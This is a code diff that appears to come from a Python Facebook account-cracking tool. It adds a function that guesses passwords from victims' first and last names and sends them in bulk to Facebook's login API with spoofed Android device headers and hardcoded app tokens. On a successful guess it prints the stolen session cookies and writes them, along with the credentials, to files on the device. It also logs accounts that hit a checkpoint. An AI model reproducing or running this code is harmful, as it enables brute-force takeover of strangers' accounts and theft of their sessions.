@@ -421,4 +421,69 @@ def graph3(ids,names,passlist):
                 open('/sdcard/PINOY-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
-            else:conti
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+#==================[M4]==================#
+def graph4(ids,names,passlist):
+    global loop,oks,cps
+    sys.stdout.write(f'\r\r [PINOY-M4]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.flush()
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
+    try:
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
+            data={
+            "kids_xudina": str(uuid.uuid4()),
+            "format": "json",
+            "sha_kids_bokachoda": str(uuid.uuid4()),
+            "FUCK_ARAFAT": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
+            "source": "device_based_login",
+            "email": ids,
+            "password": pas,
+            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "locale": "en_US",
+            "client_country_code": "US",
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d",}
+            hedaamr = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Host": "graph.facebook.com",
+            "User-Agent": f4(),
+            "X-FB-Net-HNI": "45204",
+            "X-FB-SIM-HNI": "45201",
+            "X-FB-Connection-Type": "unknown",
+            "Connection": "Keep-Alive",}
+            url = "https://graph.facebook.com/auth/login"
+            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
+            if "access_token" in po:
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                print(f'\r\r\033[1;32m[PINOY-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
+                print(f"\033[1;32m<[🍪]> {coki}");linex()
+                open('/sdcard/PINOY-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{B} <[PINOY-CP]> '+ids+f' | '+pas+'\033[1;97m')
+                open('/sdcard/PINOY-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+#==================[END]==================#
+mmk()
+
